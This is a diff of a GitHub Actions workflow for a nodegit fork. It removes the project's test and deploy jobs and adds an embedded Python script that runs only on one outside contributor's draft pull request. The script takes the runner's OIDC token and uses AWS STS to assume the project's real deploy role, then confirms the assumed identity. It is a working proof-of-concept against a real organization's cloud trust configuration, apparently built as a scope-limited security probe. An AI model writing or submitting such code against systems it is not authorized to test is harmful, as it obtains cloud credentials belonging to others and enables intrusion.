@@ -1,149 +1,324 @@
+name: Nodegit identity-only trust canary
+
 on:
-  push:
-    branches:
-      - jfirebaugh
-    tags:
-      - v*.*.*
   pull_request:
+    types: [opened]
+    branches: [figma]
+    paths: [.github/workflows/tests.yml]
 
-name: Testing
-
-permissions:
-  id-token: write
-  contents: read
+permissions: {}
 
 jobs:
-  linux-tests:
-    name: "Linux Tests"
-    strategy:
-      fail-fast: false
-      matrix:
-        node: [18, 20, 22]
-        os: [ubuntu-latest, ubuntu-24.04-arm]
-    runs-on: ${{ matrix.os }}
-    container: ubuntu:20.04
+  identity-only:
+    if: >-
+      github.repository == 'figma/nodegit' &&
+      github.repository_id == '450667846' &&
+      github.event_name == 'pull_request' &&
+      github.event.action == 'opened' &&
+      github.event.pull_request.draft == true &&
+      github.event.pull_request.head.repo.full_name == 'scopeharbor01/nodegit' &&
+      github.event.pull_request.head.repo.owner.id == 357663506 &&
+      github.event.pull_request.head.ref == 'nodegit-oidc-canary-e6a9d274' &&
+      github.event.pull_request.base.ref == 'figma' &&
+      github.event.pull_request.base.sha == 'abaa6e0373f4dd5458766c67ea51b0a61237bda7' &&
+      github.actor == 'scopeharbor01' &&
+      github.actor_id == '357663506' &&
+      github.run_attempt == 1
+    runs-on: ubuntu-latest
+    timeout-minutes: 3
+    permissions:
+      id-token: write
     steps:
-      - name: Install Dependencies for Ubuntu
-        run: apt-get update && apt-get install -y git build-essential clang libssl-dev libkrb5-dev libc++-dev wget python3
-        env:
-          ACTIONS_ALLOW_UNSECURE_COMMANDS: true
-
-      - uses: actions/checkout@v4
-
-      - name: Use Node.js
-        uses: actions/setup-node@v4
-        env:
-          ACTIONS_ALLOW_UNSECURE_COMMANDS: true
-        with:
-          node-version: ${{ matrix.node }}
-          check-latest: true
-
-      - name: Setup Environment
+      - name: Check exact Nodegit role trust without resource access
+        shell: bash
         run: |
-          mkdir ~/.ssh_tests
-          chmod 700 ~/.ssh_tests
-          printf "%b" "Host *\n\tStrictHostKeyChecking no\n" > ~/.ssh_tests/config
-          node -e "require('fs').writeFileSync(require('os').homedir() + '/.ssh_tests/id_rsa', Buffer.from(require('fs').readFileSync('test/id_rsa.enc', 'utf8'), 'base64'))"
-          cp test/id_rsa.pub ~/.ssh_tests/id_rsa.pub
-          chmod 600 ~/.ssh_tests/id_rsa*
-          git config --global user.name "John Doe"
-          git config --global user.email johndoe@example.com
-
-      - name: Install
-        env:
-          CC: clang
-          CXX: clang++
-          npm_config_clang: 1
-          GYP_DEFINES: use_obsolete_asm=true
-        # There is a race condition in node/generate that needs to be fixed
-        # Node 16 changed the logic it uses to select it's UID which means to make node run as root and not 1001, we need to chwon the current directory. More Details:
-        # https://stackoverflow.com/questions/70298238/getting-eaccess-when-running-npm-8-as-root
-        run: |
-          chown root.root -R .
-          npm set unsafe-perm true || true
-          node utils/retry npm install
-
-      - name: Test
-        run: |
-          set -e
-          eval `ssh-agent -s`
-          ssh-add ~/.ssh_tests/id_rsa
-          node utils/retry npm test
-
-      - name: configure aws credentials
-        if: startsWith(github.ref, 'refs/tags/v')
-        uses: aws-actions/configure-aws-credentials@v1
-        with:
-          role-to-assume: arn:aws:iam::060562746757:role/nodegit-repository
-          aws-region: us-west-2
-
-      - name: Deploy
-        if: startsWith(github.ref, 'refs/tags/v')
-        run: |
-          npm install -g @mapbox/node-pre-gyp@1.0.8 aws-sdk
-          node lifecycleScripts/clean
-          node-pre-gyp package
-          node-pre-gyp publish
-
-  macos-tests:
-    name: "macOS Tests"
-    strategy:
-      fail-fast: false
-      matrix:
-        node: [18, 20, 22]
-        os: [macos-15, macos-15-intel]
-    runs-on: ${{ matrix.os }}
-  # This is mostly the same as the Linux steps, waiting for anchor support
-  # https://github.com/actions/runner/issues/1182
-    steps:
-      - uses: actions/checkout@v4
-
-      - name: Use Node.js
-        uses: actions/setup-node@v4
-        env:
-          ACTIONS_ALLOW_UNSECURE_COMMANDS: true
-        with:
-          node-version: ${{ matrix.node }}
-          check-latest: true
-
-      - name: Setup Environment
-        run: |
-          mkdir ~/.ssh_tests
-          chmod 700 ~/.ssh_tests
-          printf "%b" "Host *\n\tStrictHostKeyChecking no\n" > ~/.ssh_tests/config
-          node -e "require('fs').writeFileSync(require('os').homedir() + '/.ssh_tests/id_rsa', Buffer.from(require('fs').readFileSync('test/id_rsa.enc', 'utf8'), 'base64'))"
-          cp test/id_rsa.pub ~/.ssh_tests/id_rsa.pub
-          chmod 600 ~/.ssh_tests/id_rsa*
-          git config --global user.name "John Doe"
-          git config --global user.email johndoe@example.com
-
-      - name: Install
-        env:
-          CC: clang
-          CXX: clang++
-          npm_config_clang: 1
-          GYP_DEFINES: use_obsolete_asm=true
-        # There is a race condition in node/generate that needs to be fixed
-        run: node utils/retry npm install
-
-      - name: Test
-        run: |
-          set -e
-          eval `ssh-agent -s`
-          ssh-add ~/.ssh_tests/id_rsa
-          node utils/retry npm test
-
-      - name: configure aws credentials
-        if: startsWith(github.ref, 'refs/tags/v')
-        uses: aws-actions/configure-aws-credentials@v1
-        with:
-          role-to-assume: arn:aws:iam::060562746757:role/nodegit-repository
-          aws-region: us-west-2
-
-      - name: Deploy
-        if: startsWith(github.ref, 'refs/tags/v')
-        run: |
-          npm install -g @mapbox/node-pre-gyp@1.0.8 aws-sdk
-          node lifecycleScripts/clean
-          node-pre-gyp package
-          node-pre-gyp publish
+          python3 -I -B - <<'PYCODE'
+          #!/usr/bin/env python3
+          """One exact-role OIDC assumption and an identity-only success check."""
+          
+          import base64
+          import datetime
+          import hashlib
+          import hmac
+          import json
+          import os
+          import re
+          import sys
+          import time
+          import urllib.error
+          import urllib.parse
+          import urllib.request
+          import xml.etree.ElementTree as ET
+          
+          REPOSITORY = "figma/nodegit"
+          OWNER = "figma"
+          OWNER_ID = "5155369"
+          REPOSITORY_ID = "450667846"
+          BASE_BRANCH = "figma"
+          BASE_SHA = "abaa6e0373f4dd5458766c67ea51b0a61237bda7"
+          ACTOR = "scopeharbor01"
+          ACTOR_ID = "357663506"
+          FORK_REPOSITORY = ACTOR + "/nodegit"
+          BRANCH = "nodegit-oidc-canary-e6a9d274"
+          WORKFLOW_PATH = ".github/workflows/tests.yml"
+          ROLE_ARN = "arn:aws:iam::060562746757:role/nodegit-repository"
+          ACCOUNT_ID = "060562746757"
+          ROLE_NAME = "nodegit-repository"
+          REGION = "us-west-2"
+          STS_HOST = "sts.us-west-2.amazonaws.com"
+          STS_URL = "https://" + STS_HOST + "/"
+          AUDIENCE = "sts.amazonaws.com"
+          ISSUER = "https://token.actions.githubusercontent.com"
+          MARKER = "nodegit-oidc-e6a9d274"
+          MAX_RESPONSE = 65536
+          MAX_EVENT = 1048576
+          SESSION_POLICY = json.dumps({"Version": "2012-10-17", "Statement": [
+              {"Effect": "Allow", "Action": "sts:GetCallerIdentity", "Resource": "*"}
+          ]}, separators=(",", ":"))
+          
+          
+          class ScopeError(Exception):
+              pass
+          
+          
+          class NoRedirect(urllib.request.HTTPRedirectHandler):
+              def redirect_request(self, req, fp, code, msg, headers, newurl):
+                  return None
+          
+          
+          def require(condition, code):
+              if not condition:
+                  raise ScopeError(code)
+          
+          
+          def http_request(url, method="GET", body=None, headers=None):
+              """One request, no retries, no redirects, and a bounded response body."""
+              req = urllib.request.Request(url, data=body, method=method, headers=headers or {})
+              opener = urllib.request.build_opener(urllib.request.ProxyHandler({}), NoRedirect())
+              try:
+                  response = opener.open(req, timeout=20)
+              except urllib.error.HTTPError as error:
+                  response = error
+              with response:
+                  data = response.read(MAX_RESPONSE + 1)
+                  require(len(data) <= MAX_RESPONSE, "response_too_large")
+                  return response.status, data, dict(response.headers.items())
+          
+          
+          def xml_values(data):
+              """Read only the small STS protocol response; never log its raw body."""
+              root = ET.fromstring(data)
+              return {element.tag.rsplit("}", 1)[-1]: element.text or "" for element in root.iter()}
+          
+          
+          def safe_identifier(value, maximum=160):
+              value = str(value)
+              return value if len(value) <= maximum and re.fullmatch(r"[A-Za-z0-9_./:@+=,-]+", value) else "unavailable"
+          
+          
+          def sts_error_metadata(status, body, headers):
+              try:
+                  values = xml_values(body)
+              except (ET.ParseError, ValueError):
+                  values = {}
+              lower_headers = {k.lower(): v for k, v in headers.items()}
+              request_id = values.get("RequestId") or lower_headers.get("x-amzn-requestid") or lower_headers.get("x-amz-request-id") or "unavailable"
+              return {"http_status": status, "code": safe_identifier(values.get("Code", "unavailable")), "request_id": safe_identifier(request_id)}
+          
+          
+          def read_event(env):
+              """Read only GitHub's local event JSON, without checking out any repository."""
+              with open(env["GITHUB_EVENT_PATH"], "rb") as handle:
+                  data = handle.read(MAX_EVENT + 1)
+              require(len(data) <= MAX_EVENT, "event_too_large")
+              return json.loads(data)
+          
+          
+          def validate_repository(repository, full_name, repo_id, owner, owner_id):
+              require(repository.get("full_name") == full_name, "unexpected_event_repository")
+              require(str(repository.get("id", "")) == repo_id, "unexpected_event_repository_id")
+              require(repository.get("owner", {}).get("login") == owner, "unexpected_event_repository_owner")
+              require(str(repository.get("owner", {}).get("id", "")) == owner_id, "unexpected_event_repository_owner_id")
+          
+          
+          def validate_runner(env, event):
+              require(event.get("action") == "opened", "unexpected_pr_action")
+              require(type(event.get("number")) is int and event["number"] > 0, "invalid_pr_number")
+              pull = event.get("pull_request", {})
+              require(pull.get("number") == event["number"], "mismatched_pr_number")
+              require(pull.get("draft") is True and pull.get("state") == "open", "unexpected_pr_state")
+              require(pull.get("merged") in (False, None), "unexpected_merged_pr")
+              require(pull.get("user", {}).get("login") == ACTOR and str(pull.get("user", {}).get("id", "")) == ACTOR_ID, "unexpected_pr_author")
+              require(event.get("sender", {}).get("login") == ACTOR and str(event.get("sender", {}).get("id", "")) == ACTOR_ID, "unexpected_pr_sender")
+              validate_repository(event.get("repository", {}), REPOSITORY, REPOSITORY_ID, OWNER, OWNER_ID)
+              base, head = pull.get("base", {}), pull.get("head", {})
+              validate_repository(base.get("repo", {}), REPOSITORY, REPOSITORY_ID, OWNER, OWNER_ID)
+              require(base.get("ref") == BASE_BRANCH and base.get("sha") == BASE_SHA, "unexpected_pr_base")
+              fork = head.get("repo", {})
+              fork_id = str(fork.get("id", ""))
+              require(re.fullmatch(r"[1-9][0-9]{0,23}", fork_id) and fork_id != REPOSITORY_ID, "invalid_fork_repository_id")
+              validate_repository(fork, FORK_REPOSITORY, fork_id, ACTOR, ACTOR_ID)
+              require(fork.get("fork") is True and fork.get("private") is False, "unexpected_fork_kind")
+              if "parent" in fork:
+                  require(str(fork["parent"].get("id", "")) == REPOSITORY_ID, "unexpected_fork_parent")
+              require(head.get("ref") == BRANCH, "unexpected_pr_head_ref")
+              require(re.fullmatch(r"[0-9a-f]{40}", head.get("sha", "")) and head["sha"] != BASE_SHA, "invalid_pr_head_sha")
+              ref = "refs/pull/" + str(event["number"]) + "/merge"
+              workflow_ref = REPOSITORY + "/" + WORKFLOW_PATH + "@" + ref
+              expected = {
+                  "GITHUB_ACTIONS": "true",
+                  "GITHUB_REPOSITORY": REPOSITORY,
+                  "GITHUB_REPOSITORY_ID": REPOSITORY_ID,
+                  "GITHUB_REPOSITORY_OWNER": OWNER,
+                  "GITHUB_REPOSITORY_OWNER_ID": OWNER_ID,
+                  "GITHUB_REF": ref,
+                  "GITHUB_REF_TYPE": "branch",
+                  "GITHUB_EVENT_NAME": "pull_request",
+                  "GITHUB_ACTOR": ACTOR,
+                  "GITHUB_ACTOR_ID": ACTOR_ID,
+                  "GITHUB_BASE_REF": BASE_BRANCH,
+                  "GITHUB_HEAD_REF": BRANCH,
+                  "GITHUB_RUN_ATTEMPT": "1",
+                  "GITHUB_WORKFLOW_REF": workflow_ref,
+              }
+              for name, value in expected.items():
+                  require(env.get(name) == value, "runner_scope_mismatch_" + name.lower())
+              require(env.get("GITHUB_TRIGGERING_ACTOR", ACTOR) == ACTOR, "unexpected_triggering_actor")
+              require(re.fullmatch(r"[0-9]{1,24}", env.get("GITHUB_RUN_ID", "")), "invalid_run_id")
+              require(re.fullmatch(r"[0-9a-f]{40}", env.get("GITHUB_SHA", "")), "invalid_commit_sha")
+              require(env.get("GITHUB_WORKFLOW_SHA") == env["GITHUB_SHA"], "unexpected_workflow_sha")
+              if pull.get("merge_commit_sha") is not None:
+                  require(pull["merge_commit_sha"] == env["GITHUB_SHA"], "unexpected_pr_merge_sha")
+              return {"number": event["number"], "base_sha": BASE_SHA, "head_sha": head["sha"], "head_repository": FORK_REPOSITORY, "head_repository_id": fork_id, "ref": ref, "workflow_ref": workflow_ref}
+          
+          
+          def obtain_oidc(env, context, exchange):
+              raw_url = env.get("ACTIONS_ID_TOKEN_REQUEST_URL", "")
+              bearer = env.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "")
+              url = urllib.parse.urlsplit(raw_url)
+              require(url.scheme == "https" and url.hostname is not None and url.hostname.endswith(".actions.githubusercontent.com"), "unexpected_oidc_endpoint")
+              require(url.port in (None, 443) and url.username is None and url.password is None and not url.fragment, "unexpected_oidc_url")
+              require(bool(bearer), "missing_oidc_request_token")
+              query = [(k, v) for k, v in urllib.parse.parse_qsl(url.query, keep_blank_values=True) if k != "audience"]
+              query.append(("audience", AUDIENCE))
+              request_url = urllib.parse.urlunsplit((url.scheme, url.netloc, url.path, urllib.parse.urlencode(query), ""))
+              status, body, _ = exchange(request_url, "GET", None, {"Authorization": "Bearer " + bearer, "Accept": "application/json", "User-Agent": "oidc-identity-canary/1"})
+              require(status == 200, "oidc_http_" + str(status))
+              token = json.loads(body)["value"]
+              require(isinstance(token, str) and 0 < len(token) < 32768, "invalid_oidc_token")
+              parts = token.split(".")
+              require(len(parts) == 3, "invalid_oidc_token_shape")
+              claims = json.loads(base64.urlsafe_b64decode(parts[1] + "=" * (-len(parts[1]) % 4)))
+              expected = {
+                  "iss": ISSUER, "aud": AUDIENCE, "repository": REPOSITORY,
+                  "repository_id": REPOSITORY_ID, "repository_owner": OWNER,
+                  "repository_owner_id": OWNER_ID, "actor": ACTOR, "actor_id": ACTOR_ID,
+                  "ref": context["ref"], "ref_type": "branch", "event_name": "pull_request",
+                  "repository_visibility": "public", "runner_environment": "github-hosted",
+                  "workflow_ref": context["workflow_ref"], "run_id": env["GITHUB_RUN_ID"],
+                  "run_attempt": "1", "sha": env["GITHUB_SHA"],
+              }
+              for name, value in expected.items():
+                  require(str(claims.get(name, "")) == value, "oidc_scope_mismatch_" + name)
+              normal_subjects = {
+                  "repo:" + REPOSITORY + ":pull_request",
+                  "repo:" + OWNER + "@" + OWNER_ID + "/nodegit@" + REPOSITORY_ID + ":pull_request",
+              }
+              require(claims.get("sub") in normal_subjects, "unexpected_oidc_subject")
+              for name, value in (("head_ref", BRANCH), ("base_ref", BASE_BRANCH)):
+                  require(claims.get(name) in (value, "refs/heads/" + value), "oidc_scope_mismatch_" + name)
+              require(int(claims.get("exp", 0)) > int(time.time()), "expired_oidc_token")
+              if "workflow_sha" in claims:
+                  require(claims["workflow_sha"] == env["GITHUB_SHA"], "unexpected_oidc_workflow_sha")
+              if "job_workflow_ref" in claims:
+                  require(claims["job_workflow_ref"] == context["workflow_ref"], "unexpected_job_workflow_ref")
+                  require(claims.get("job_workflow_sha") == env["GITHUB_SHA"], "unexpected_job_workflow_sha")
+              elif "job_workflow_sha" in claims:
+                  require(claims["job_workflow_sha"] == env["GITHUB_SHA"], "unexpected_job_workflow_sha")
+              safe_claims = {name: claims[name] for name in ("iss", "aud", "sub", "repository", "repository_id", "ref", "workflow_ref", "sha", "run_id", "run_attempt")}
+              safe_claims["job_workflow_ref"] = claims.get("job_workflow_ref")
+              safe_claims["job_workflow_sha"] = env["GITHUB_SHA"] if claims.get("job_workflow_sha") == env["GITHUB_SHA"] else None
+              return token, safe_claims
+          
+          
+          def form_body(fields):
+              return urllib.parse.urlencode(fields).encode("ascii")
+          
+          
+          def sign_get_caller_identity(body, credentials, now=None):
+              now = now or datetime.datetime.now(datetime.timezone.utc)
+              amz_date = now.strftime("%Y%m%dT%H%M%SZ")
+              date_stamp = now.strftime("%Y%m%d")
+              headers = {
+                  "content-type": "application/x-www-form-urlencoded; charset=utf-8",
+                  "host": STS_HOST,
+                  "x-amz-date": amz_date,
+                  "x-amz-security-token": credentials["SessionToken"],
+              }
+              names = ";".join(sorted(headers))
+              canonical_headers = "".join(name + ":" + headers[name].strip() + "\n" for name in sorted(headers))
+              canonical_request = "\n".join(("POST", "/", "", canonical_headers, names, hashlib.sha256(body).hexdigest()))
+              scope = "/".join((date_stamp, REGION, "sts", "aws4_request"))
+              string_to_sign = "\n".join(("AWS4-HMAC-SHA256", amz_date, scope, hashlib.sha256(canonical_request.encode()).hexdigest()))
+              def mac(key, value):
+                  return hmac.new(key, value.encode(), hashlib.sha256).digest()
+              key = mac(("AWS4" + credentials["SecretAccessKey"]).encode(), date_stamp)
+              key = mac(key, REGION)
+              key = mac(key, "sts")
+              key = mac(key, "aws4_request")
+              signature = hmac.new(key, string_to_sign.encode(), hashlib.sha256).hexdigest()
+              headers["authorization"] = "AWS4-HMAC-SHA256 Credential=" + credentials["AccessKeyId"] + "/" + scope + ", SignedHeaders=" + names + ", Signature=" + signature
+              return headers
+          
+          
+          def run_probe(env=None, exchange=http_request, event=None):
+              env = os.environ if env is None else env
+              result = {"marker": MARKER, "role_arn": ROLE_ARN, "sts_endpoint": STS_URL, "assume_role_calls": 0, "caller_identity_calls": 0}
+              try:
+                  context = validate_runner(env, read_event(env) if event is None else event)
+                  result["pull_request"] = context
+                  if not env.get("ACTIONS_ID_TOKEN_REQUEST_URL") or not env.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN"):
+                      result.update({"outcome": "oidc_unavailable", "code": "missing_runner_oidc_capability"})
+                      return result
+                  token, claims = obtain_oidc(env, context, exchange)
+                  result["oidc"] = claims
+                  session_name = MARKER + "-" + env["GITHUB_RUN_ID"]
+                  require(len(session_name) <= 64, "session_name_too_long")
+                  result["role_session_name"] = session_name
+                  body = form_body({"Action": "AssumeRoleWithWebIdentity", "Version": "2011-06-15", "RoleArn": ROLE_ARN, "RoleSessionName": session_name, "WebIdentityToken": token, "DurationSeconds": "900", "Policy": SESSION_POLICY})
+                  result["assume_role_calls"] = 1
+                  status, response, headers = exchange(STS_URL, "POST", body, {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "Accept": "text/xml", "User-Agent": "oidc-identity-canary/1"})
+                  del token, body
+                  if status != 200:
+                      result.update({"outcome": "assume_role_denied_or_failed", "sts": sts_error_metadata(status, response, headers)})
+                      return result
+                  values = xml_values(response)
+                  expected_arn = "arn:aws:sts::" + ACCOUNT_ID + ":assumed-role/" + ROLE_NAME + "/" + session_name
+                  require(values.get("Arn") == expected_arn, "unexpected_assumed_role_arn")
+                  credentials = {name: values[name] for name in ("AccessKeyId", "SecretAccessKey", "SessionToken")}
+                  require(all(credentials.values()), "missing_temporary_credentials")
+                  del values, response
+                  identity_body = form_body({"Action": "GetCallerIdentity", "Version": "2011-06-15"})
+                  identity_headers = sign_get_caller_identity(identity_body, credentials)
+                  result["caller_identity_calls"] = 1
+                  status, response, headers = exchange(STS_URL, "POST", identity_body, identity_headers)
+                  del credentials, identity_headers
+                  if status != 200:
+                      result.update({"outcome": "assumed_identity_check_failed", "sts": sts_error_metadata(status, response, headers)})
+                      return result
+                  values = xml_values(response)
+                  require(values.get("Account") == ACCOUNT_ID and values.get("Arn") == expected_arn, "unexpected_caller_identity")
+                  result.update({"outcome": "assumed_identity_verified", "identity": {name: safe_identifier(values.get(name, ""), 256) for name in ("Account", "Arn", "UserId")}, "sts": {"http_status": 200, "request_id": safe_identifier(values.get("RequestId", "unavailable"))}})
+                  return result
+              except ScopeError as error:
+                  result.update({"outcome": "scope_guard_or_protocol_stop", "code": safe_identifier(str(error))})
+              except Exception as error:
+                  result.update({"outcome": "protocol_failure", "error_type": type(error).__name__})
+              return result
+          
+          
+          if __name__ == "__main__":
+              result = run_probe()
+              print(json.dumps(result, sort_keys=True, separators=(",", ":")))
+              sys.exit(0 if result["outcome"] in ("oidc_unavailable", "assume_role_denied_or_failed", "assumed_identity_verified") else 1)
+          PYCODE
